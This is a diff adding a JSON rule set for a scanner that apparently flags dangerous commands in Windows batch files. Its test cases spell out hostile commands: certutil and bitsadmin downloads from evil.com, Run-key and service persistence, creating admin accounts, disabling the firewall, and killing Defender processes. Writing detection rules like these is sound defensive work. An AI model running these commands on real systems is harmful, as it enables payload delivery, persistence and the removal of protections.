@@ -1,0 +1,240 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Shell Execution",
+  "rules": [
+    {
+      "id": "BAT-001",
+      "title": "Certutil decode/download",
+      "description": "certutil is a Windows LOLBin commonly abused to download files or decode payloads.",
+      "severity": "critical",
+      "patterns": [
+        "\\bcertutil\\b[^\\n]*-urlcache",
+        "\\bcertutil\\b[^\\n]*-decode",
+        "\\bcertutil\\b[^\\n]*-decodehex"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Do not use certutil for downloading or decoding. Use proper package managers.",
+      "test_cases": {
+        "should_match": [
+          "certutil -urlcache -split -f https://evil.com/payload.exe payload.exe",
+          "certutil -decode encoded.txt decoded.exe",
+          "certutil -decodehex hex.txt out.exe"
+        ],
+        "should_not_match": [
+          "certutil -verify cert.pem",
+          "certutil -hashfile file.exe SHA256"
+        ]
+      }
+    },
+    {
+      "id": "BAT-002",
+      "title": "Bitsadmin file download",
+      "description": "bitsadmin is a Windows LOLBin used to download files in the background.",
+      "severity": "critical",
+      "patterns": [
+        "\\bbitsadmin\\b[^\\n]*/transfer",
+        "\\bbitsadmin\\b[^\\n]*/addfile"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Do not use bitsadmin for downloads. Use proper package management.",
+      "test_cases": {
+        "should_match": [
+          "bitsadmin /transfer myJob https://evil.com/payload.exe C:\\payload.exe",
+          "bitsadmin /addfile myJob https://evil.com/file C:\\file"
+        ],
+        "should_not_match": [
+          "bitsadmin /info myJob",
+          "bitsadmin /list"
+        ]
+      }
+    },
+    {
+      "id": "BAT-003",
+      "title": "Registry modification",
+      "description": "Direct registry modification via reg.exe can establish persistence or disable security.",
+      "severity": "high",
+      "patterns": [
+        "\\breg\\s+add\\b",
+        "\\breg\\s+delete\\b[^\\n]*/f"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Batch scripts should not modify the Windows registry.",
+      "test_cases": {
+        "should_match": [
+          "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d evil.exe",
+          "reg delete HKLM\\SOFTWARE\\Security /f"
+        ],
+        "should_not_match": [
+          "reg query HKLM\\SOFTWARE",
+          "reg export HKLM\\SOFTWARE backup.reg"
+        ]
+      }
+    },
+    {
+      "id": "BAT-004",
+      "title": "User account manipulation",
+      "description": "Creating or modifying user accounts enables unauthorized access.",
+      "severity": "critical",
+      "patterns": [
+        "\\bnet\\s+user\\s+[^/]*\\/add",
+        "\\bnet\\s+localgroup\\s+administrators\\b[^\\n]*/add",
+        "\\bnet\\s+user\\s+[^\\s]+\\s+[^/\\s]+"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Scripts should not create or modify user accounts.",
+      "test_cases": {
+        "should_match": [
+          "net user hacker P@ssw0rd /add",
+          "net localgroup administrators hacker /add",
+          "net user admin NewPassword"
+        ],
+        "should_not_match": [
+          "net user",
+          "net user administrator"
+        ]
+      }
+    },
+    {
+      "id": "BAT-005",
+      "title": "Firewall manipulation",
+      "description": "Modifying firewall rules can expose the system to network attacks.",
+      "severity": "high",
+      "patterns": [
+        "\\bnetsh\\s+advfirewall\\s+[^\\n]*\\boff\\b",
+        "\\bnetsh\\s+advfirewall\\s+firewall\\s+add\\s+rule",
+        "\\bnetsh\\s+firewall\\s+set\\s+opmode\\s+disable"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Scripts should not modify firewall rules.",
+      "test_cases": {
+        "should_match": [
+          "netsh advfirewall set allprofiles state off",
+          "netsh advfirewall firewall add rule name=\"backdoor\" dir=in action=allow",
+          "netsh firewall set opmode disable"
+        ],
+        "should_not_match": [
+          "netsh advfirewall show allprofiles",
+          "netsh interface show interface"
+        ]
+      }
+    },
+    {
+      "id": "BAT-006",
+      "title": "Windows service creation",
+      "description": "Creating Windows services establishes persistent execution with SYSTEM privileges.",
+      "severity": "high",
+      "patterns": [
+        "\\bsc\\s+create\\b",
+        "\\bsc\\s+config\\b[^\\n]*\\bstart\\s*=\\s*auto"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Scripts should not create Windows services.",
+      "test_cases": {
+        "should_match": [
+          "sc create backdoor binPath= C:\\evil.exe",
+          "sc config malware start= auto"
+        ],
+        "should_not_match": [
+          "sc query",
+          "sc stop myservice"
+        ]
+      }
+    },
+    {
+      "id": "BAT-007",
+      "title": "Kill security processes",
+      "description": "Terminating antivirus and security processes removes system protection.",
+      "severity": "critical",
+      "patterns": [
+        "\\btaskkill\\b[^\\n]*(MsMpEng|MpCmdRun|SecurityHealth|WinDefend|ccSvcHst|avgnt|avguard|bdagent|ekrn)",
+        "\\bnet\\s+stop\\b[^\\n]*(WinDefend|MpsSvc|wscsvc|SecurityHealthService)"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Never kill security processes. Remove security-disabling commands.",
+      "test_cases": {
+        "should_match": [
+          "taskkill /f /im MsMpEng.exe",
+          "taskkill /f /im SecurityHealthSystray.exe",
+          "net stop WinDefend",
+          "net stop MpsSvc"
+        ],
+        "should_not_match": [
+          "taskkill /f /im notepad.exe",
+          "net stop myservice"
+        ]
+      }
+    },
+    {
+      "id": "BAT-008",
+      "title": "PowerShell from batch",
+      "description": "Launching hidden or encoded PowerShell from batch scripts indicates evasion.",
+      "severity": "high",
+      "patterns": [
+        "\\bpowershell\\b[^\\n]*-[Ww](indowStyle)?\\s*[Hh]idden",
+        "\\bpowershell\\b[^\\n]*-[Ee]nc(odedCommand)?\\s+[A-Za-z0-9+/=]"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Do not launch hidden or encoded PowerShell from batch. Use plain scripts.",
+      "test_cases": {
+        "should_match": [
+          "powershell -WindowStyle Hidden -File evil.ps1",
+          "powershell -W Hidden -Command \"IEX(payload)\"",
+          "powershell -enc SQBFAFAA=="
+        ],
+        "should_not_match": [
+          "powershell -File setup.ps1",
+          "powershell Get-Date"
+        ]
+      }
+    },
+    {
+      "id": "BAT-009",
+      "title": "Wscript/Cscript execution",
+      "description": "Windows Script Host can execute VBScript/JScript for malicious purposes.",
+      "severity": "high",
+      "patterns": [
+        "\\bwscript\\b[^\\n]*\\.vbs",
+        "\\bcscript\\b[^\\n]*\\.vbs",
+        "\\bwscript\\b[^\\n]*\\.js\\b",
+        "\\bcscript\\b[^\\n]*\\.js\\b"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Avoid Windows Script Host execution. Use modern scripting alternatives.",
+      "test_cases": {
+        "should_match": [
+          "wscript evil.vbs",
+          "cscript //nologo payload.vbs",
+          "wscript C:\\temp\\dropper.js",
+          "cscript script.js"
+        ],
+        "should_not_match": [
+          "echo wscript disabled",
+          "rem cscript is deprecated"
+        ]
+      }
+    },
+    {
+      "id": "BAT-010",
+      "title": "Hidden file creation",
+      "description": "Creating hidden files can conceal malicious payloads on disk.",
+      "severity": "medium",
+      "patterns": [
+        "\\battrib\\s+\\+[hH]\\b",
+        "\\battrib\\s+\\+[sS]\\s+\\+[hH]\\b"
+      ],
+      "file_extensions": ["bat", "cmd"],
+      "remediation": "Do not create hidden files. All files should be visible for audit.",
+      "test_cases": {
+        "should_match": [
+          "attrib +h C:\\evil.exe",
+          "attrib +H payload.dll",
+          "attrib +s +h C:\\backdoor"
+        ],
+        "should_not_match": [
+          "attrib -h file.txt",
+          "attrib file.txt"
+        ]
+      }
+    }
+  ]
+}
